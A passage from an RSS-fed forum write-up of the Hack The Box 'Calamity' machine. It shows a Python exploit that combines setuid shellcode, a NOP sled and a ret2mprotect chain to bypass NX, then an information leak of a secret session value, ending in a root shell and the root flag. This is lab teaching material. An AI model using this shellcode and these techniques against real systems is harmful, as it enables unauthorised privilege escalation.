payload += p(0xbfedf000) # start of stack
payload += p(0x121000)   # size of stack
payload += p(0x7)        # permissions
payload += p(0xbfffee48) # vulnerable pointer
</code></pre>
<blockquote>
<p>Note: Never run shellcode if you don’t know what it does.</p>
</blockquote>
<p>With this template figured out we can begin building our exploit, but we will need some shellcode to execute, I went with this <a href="http://shell-storm.org/shellcode/files/shellcode-61.php" rel="nofollow noopener">entry</a> from <code>shell-storm</code> as it performs <code>setuid(0)</code> as well as being able to fit in very limited space being only 28-bytes.</p>
<pre><code class="lang-python">#!/usr/bin/python
import os
import struct

# convert address to little-endian format
def p(arg):
	return struct.pack('&lt;L', arg)

# /bin/dash
shellcode = "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"
nops = "\x90" * 10

# crash with embedded nopsled into shellcode
payload = nops
payload += shellcode

# padding
payload += "A" * ( 76 - len(shellcode) - len(nops) )

# re-enable execution in stack context
payload += p(0xb7efcd50) # mprotect
payload += p(0xb7fdac31) # ropgadget for pop3ret
payload += p(0xbfedf000) # start of stack
payload += p(0x121000)   # size of stack
payload += p(0x7)        # permissions

payload += p(0xbfffee48) # vulnerable pointer
print payload
</code></pre>
<p>Now let’s generate our exploit and check out what it looks like in file form</p>
<pre><code class="lang-bash">xalvas@calamity:/tmp/test$ python exploit.py &gt; exploit
xalvas@calamity:/tmp/test$ cat exploit
����������1ۍC�̀1�Qhn/shh//bi�A
                              ��̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP���1������H���
</code></pre>
<p>Now by loading this into the <code>debug</code> function we should get a crash. However keep an eye on the vulnerable pointer reported by the <code>debug</code> function because it will change on each instance of the program, and likely we have crashed it a few times by now <img src="https://0x00sec.org/images/emoji/twitter/sunglasses.png?v=9" title=":sunglasses:" class="emoji" alt=":sunglasses:"></p>
<pre><code class="lang-bash">gdb-peda$ jump debug
Continuing at 0x80000c15.

this function is problematic on purpose

Im trying to test some things...and that means get control of the program! 
vulnerable pointer is at bfffee48
memory information on this binary:

80000000-80002000 r-xp 00000000 08:01 404837     /home/xalvas/app/goodluck
80002000-80003000 r--p 00001000 08:01 404837     /home/xalvas/app/goodluck
80003000-80004000 rw-p 00002000 08:01 404837     /home/xalvas/app/goodluck
80004000-80025000 rw-p 00000000 00:00 0          [heap]
b7e1a000-b7e54000 r-xp 00000000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e54000-b7e55000 r--p 0003a000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e55000-b7fca000 r-xp 0003b000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fca000-b7fcc000 r--p 001af000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcc000-b7fcd000 rw-p 001b1000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcd000-b7fd0000 rw-p 00000000 00:00 0 
b7fd6000-b7fd8000 rw-p 00000000 00:00 0 
b7fd8000-b7fda000 r--p 00000000 00:00 0          [vvar]
b7fda000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
b7fdb000-b7ffd000 r-xp 00000000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7ffd000-b7ffe000 rw-p 00000000 00:00 0 
b7ffe000-b7fff000 r--p 00022000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7fff000-b8000000 rw-p 00023000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
bfedf000-c0000000 rw-p 00000000 00:00 0          [stack]



Filename:  /tmp/test/exploit
process 1680 is executing new program: /bin/dash
$ id
[New process 4492]
process 4492 is executing new program: /usr/bin/id
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
uid=1000(xalvas) gid=1000(xalvas) groups=1000(xalvas),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
$ [Inferior 2 (process 4492) exited normally]
</code></pre>
<p>Now we have re-enabled executon on the stack proven by the fact our shellcode ran <code>/bin/dash</code>, however because we have run the program through gdb to get to the <code>debug</code> menu we are sandboxed as xalvas and not running with the suid bit we saw earlier.<br>
<a name="information-leak" href="https://0x00sec.org"></a></p>
<h3>Information Leak</h3>
<p>The next step will be to find a way to jump into the <code>debug</code> menu from normal execution.</p>
<p>Initially by trying to access admin we get <code>access denied!</code> which if you read <code>attempt_login</code> from the <a href="https://0x00sec.org#source-code-review">source code review</a> section above that is because its looking for a secret value to match before it will allow you into the debug menu.</p>
<p>So lets start by fuzzing it.</p>
<pre><code class="lang-bash">xalvas@calamity:/tmp/test$ echo "A" &gt; fuzz
</code></pre>
<p>When we load this file and examine our session id from menu option two we get <code>debug info: 0x37f3a5ef</code></p>
<p>Without closing the program currently executing in gdb we get the same result until we send it 8 characters which now gives us <code>debug info: 0x0</code></p>
<p>Interesting, lets try 9: <code>debug info: 0x81fffffd</code></p>
<p>10, segfault, okay, so now we can try to get an information leak, we need to leak the value from the <code>hey</code> struct we examined earlier to get the value of the secret that gets passed to <code>attempt_login</code> to do this we need to look at the disassembly a bit more.</p>
<p>Let’s try to get an understanding of whats going on</p>
<pre><code class="lang-bash">xalvas@calamity:/tmp/test$ echo "AAAABBBBCCCCDDDD" &gt; fuzz
</code></pre>
<p>If we load this in and try to examine the session id we get a crash but look closely</p>
<pre><code class="lang-bash">[----------------------------------registers-----------------------------------]
EAX: 0x434343ab 
EBX: 0x43434343 ('CCCC')
ECX: 0xa ('\n')
EDX: 0xb7fcd87c --&gt; 0x0 
ESI: 0xb7fcc000 --&gt; 0x1b1db0 
EDI: 0xb7fcc000 --&gt; 0x1b1db0 
EBP: 0xbffff638 --&gt; 0x0 
ESP: 0xbffff610 --&gt; 0x1 
EIP: 0x80000e51 (&lt;main+218&gt;:	mov    eax,DWORD PTR [eax+0x14])
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80000e45 &lt;main+206&gt;:	cmp    BYTE PTR [ebp-0x15],0x32
   0x80000e49 &lt;main+210&gt;:	jne    0x80000e62 &lt;main+235&gt;
   0x80000e4b &lt;main+212&gt;:	lea    eax,[ebx+0x68]
=&gt; 0x80000e51 &lt;main+218&gt;:	mov    eax,DWORD PTR [eax+0x14]
   0x80000e54 &lt;main+221&gt;:	sub    esp,0xc
   0x80000e57 &lt;main+224&gt;:	push   eax
   0x80000e58 &lt;main+225&gt;:	call   0x80000be3 &lt;printdeb&gt;
   0x80000e5d &lt;main+230&gt;:	add    esp,0x10
[------------------------------------stack-------------------------------------]
0000| 0xbffff610 --&gt; 0x1 
0004| 0xbffff614 --&gt; 0x80003000 --&gt; 0x2ef4 
0008| 0xbffff618 --&gt; 0x5a5d54f6 
0012| 0xbffff61c --&gt; 0x84c01 
0016| 0xbffff620 --&gt; 0x32000001 
0020| 0xbffff624 --&gt; 0x1094d01 
0024| 0xbffff628 --&gt; 0x0 
0028| 0xbffff62c --&gt; 0x31f9663c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x80000e51 in main ()
</code></pre>
<p>What is happening here is <code>EBX</code> is getting loaded with the value of what we place after the first 8-bytes which in this case is “CCCC”, or <code>0x43434343</code>. We also see that <code>EAX</code> is getting loaded with something similar, using a calculator you will notice there is a difference of <code>0x68</code> between both values. One way of moving values around like this is to use a <code>lea</code> instruction so lets look in memory for a <code>lea</code> that copies <code>EBX+0x68</code> to <code>EAX</code> by disassembling main</p>
<pre><code class="lang-bash">gdb-peda$ disas main
Dump of assembler code for function main:
   0x80000d77 &lt;+0&gt;:	lea    ecx,[esp+0x4]
   0x80000d7b &lt;+4&gt;:	and    esp,0xfffffff0
   0x80000d7e &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]
   0x80000d81 &lt;+10&gt;:	push   ebp
   0x80000d82 &lt;+11&gt;:	mov    ebp,esp
   0x80000d84 &lt;+13&gt;:	push   ebx
   0x80000d85 &lt;+14&gt;:	push   ecx
   0x80000d86 &lt;+15&gt;:	sub    esp,0x20
   ---trimmed due to length---
   0x80000df8 &lt;+129&gt;:	add    esp,0x10
   0x80000dfb &lt;+132&gt;:	mov    DWORD PTR [ebp-0x10],0x0
   0x80000e02 &lt;+139&gt;:	mov    eax,DWORD PTR [ebp-0x1c]
   0x80000e05 &lt;+142&gt;:	or     eax,0x1010101
   0x80000e0a &lt;+147&gt;:	mov    DWORD PTR [ebp-0x14],eax
   0x80000e0d &lt;+150&gt;:	lea    eax,[ebx+0x68]
   ---trimmed due to length---
</code></pre>
<p>bingo, <code>0x80000e0d &lt;+150&gt;:	lea    eax,[ebx+0x68]</code></p>
<p>Next lets find where our hey struct lives by searching for it in memory, conveniently we can search for <code>AAAAB</code> as that is what we used in our fuzzing</p>
<pre><code class="lang-bash">gdb-peda$ searchmem AAAAB
Searching for 'AAAAB' in: None ranges
Found 2 results, display max 2 items:
goodluck : 0x80003068 ("AAAAB")
  [heap] : 0x80004978 ("AAAABBBBCCCCDDDD\n")
</code></pre>
<p>So lets start pokin around <code>0x80003068</code></p>
<pre><code class="lang-bash">gdb-peda$ x/40x 0x80003068
0x80003068 &lt;hey&gt;:	0x41	0x41	0x41	0x41	0x42	0x00	0x00	0x00
0x80003070 &lt;hey+8&gt;:	0x00	0x00	0x00	0x00	0x01	0x4d	0x09	0x01
0x80003078 &lt;hey+16&gt;:	0x00	0x00	0x00	0x00	0x3c	0x66	0xf9	0x31
0x80003080:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x80003088:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
</code></pre>
<p>Okay this is the start of our hey struct, however we don’t want this address, we actually want to find <code>0x80003068 - 0x8 - 0x68</code> as that is what will be put into <code>EBX</code> which after being put into <code>EAX</code> will put us back to right here<br>
which if you do that math will be the address <code>0x80002ff8</code></p>
<p>With this information we can move on to the next phase of our exploit, getting an information leak of our secret value needed to get into option 3</p>
<blockquote>
<p>Note: do not close the program as this changes values of our secret and there-by our information leak will be useless.</p>
</blockquote>
<pre><code class="lang-bash"># overwrite EBX with address
# overwrite EAX with address + 0x68
# this will effectively place us right at the start of our A's because
# 0x80002ff8 + 0x68 = 0x80003060

xalvas@calamity:/tmp/test$ python -c "print('A' * 8 +'\xf8\x2f\x00\x80')" &gt; phase1
</code></pre>
<p>By loading this file and observing the print session option we get the following</p>
<pre><code class="lang-bash">xalvas@calamity:~/app$ ./goodluck 

Filename:  /tmp/test/phase1


	-----MENU-----
1) leave message to admin
2) print session ID
3)login (admin only)
4)change user
5)exit

 action: 2

debug info: 0x1096f49
</code></pre>
<p><a name="assembling-the-pieces" href="https://0x00sec.org"></a></p>
<h3>Assembling The Pieces</h3>
<p>Next we need to assemble all of our pieces, we’ll start by making use of this information leak. To do this we need to place the value of our secret in the first four bytes of our file, followed by 4-bytes of junk, and then we need to step back four bytes otherwise our program will crash <code>0x80002ff8 - 0x4 = 0x80002ff4</code></p>
<pre><code class="lang-python">#!/usr/bin/python
import struct
# session_id dumped from the previous step
payload = struct.pack("&lt;I", 0x1096f49) # session_id
# padding
payload += "A" * 4
# move backwards 4 so we don't leave junk in memory which will crash the program
payload += struct.pack("&lt;I", 0x80002ff4) 
print payload

xalvas@calamity:/tmp/test$ python phase2.py &gt; phase2
</code></pre>
<p>By loading this in and attepting to access admin we are dropped into our <code>debug</code> menu.</p>
<pre><code class="lang-bash">Filename:  /tmp/test/phase2


	-----MENU-----
1) leave message to admin
2) print session ID
3)login (admin only)
4)change user
5)exit

 action: 3

this function is problematic on purpose

Im trying to test some things...and that means get control of the program! 
vulnerable pointer is at bffff5c0
memory information on this binary:

80000000-80002000 r-xp 00000000 08:01 404837     /home/xalvas/app/goodluck
80002000-80003000 r--p 00001000 08:01 404837     /home/xalvas/app/goodluck
80003000-80004000 rw-p 00002000 08:01 404837     /home/xalvas/app/goodluck
80004000-80025000 rw-p 00000000 00:00 0          [heap]
b7e1a000-b7e54000 r-xp 00000000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e54000-b7e55000 r--p 0003a000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e55000-b7fca000 r-xp 0003b000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fca000-b7fcc000 r--p 001af000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcc000-b7fcd000 rw-p 001b1000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcd000-b7fd0000 rw-p 00000000 00:00 0 
b7fd6000-b7fd8000 rw-p 00000000 00:00 0 
b7fd8000-b7fda000 r--p 00000000 00:00 0          [vvar]
b7fda000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
b7fdb000-b7ffd000 r-xp 00000000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7ffd000-b7ffe000 rw-p 00000000 00:00 0 
b7ffe000-b7fff000 r--p 00022000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7fff000-b8000000 rw-p 00023000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
bfedf000-c0000000 rw-p 00000000 00:00 0          [stack]



Filename:  
</code></pre>
<p>Next we just need to load in our exploit from earlier, but note the vulnerable pointer has changed to <code>0xbffff5c0</code> update your exploit, and <a href="https://vine.co/v/OrD3uMlwThE" rel="nofollow noopener">bask in the glory of shell</a>!</p>
<pre><code class="lang-bash">xalvas@calamity:/tmp/test$ python exploit.py &gt; exploit
</code></pre>
<pre><code class="lang-bash">this function is problematic on purpose

Im trying to test some things...and that means get control of the program! 
vulnerable pointer is at bffff5c0
memory information on this binary:

80000000-80002000 r-xp 00000000 08:01 404837     /home/xalvas/app/goodluck
80002000-80003000 r--p 00001000 08:01 404837     /home/xalvas/app/goodluck
80003000-80004000 rw-p 00002000 08:01 404837     /home/xalvas/app/goodluck
80004000-80025000 rw-p 00000000 00:00 0          [heap]
b7e1a000-b7e54000 r-xp 00000000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e54000-b7e55000 r--p 0003a000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e55000-b7fca000 r-xp 0003b000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fca000-b7fcc000 r--p 001af000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcc000-b7fcd000 rw-p 001b1000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcd000-b7fd0000 rw-p 00000000 00:00 0 
b7fd6000-b7fd8000 rw-p 00000000 00:00 0 
b7fd8000-b7fda000 r--p 00000000 00:00 0          [vvar]
b7fda000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
b7fdb000-b7ffd000 r-xp 00000000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7ffd000-b7ffe000 rw-p 00000000 00:00 0 
b7ffe000-b7fff000 r--p 00022000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7fff000-b8000000 rw-p 00023000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
bfedf000-c0000000 rw-p 00000000 00:00 0          [stack]



Filename:  /tmp/test/exploit
</code></pre>
<pre><code class="lang-bash"># id
uid=0(root) gid=1000(xalvas) groups=1000(xalvas),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
# cat /root/root.txt
9be653e014d17d1a54f9045e3220743c
</code></pre>
          <p><a href="https://0x00sec.org/t/htb-calamity-write-up-ret2mprotect-bypass-nx-info-leak/5139/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/htb-calamity-write-up-ret2mprotect-bypass-nx-info-leak/5139/1</link>
        <pubDate>Sun, 28 Jan 2018 09:22:37 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-5139-1</guid>
        <source url="https://0x00sec.org/t/htb-calamity-write-up-ret2mprotect-bypass-nx-info-leak/5139.rss">HTB Calamity write-up (ret2mprotect, bypass nx, info leak)</source>
      </item>
  </channel>
</rss>
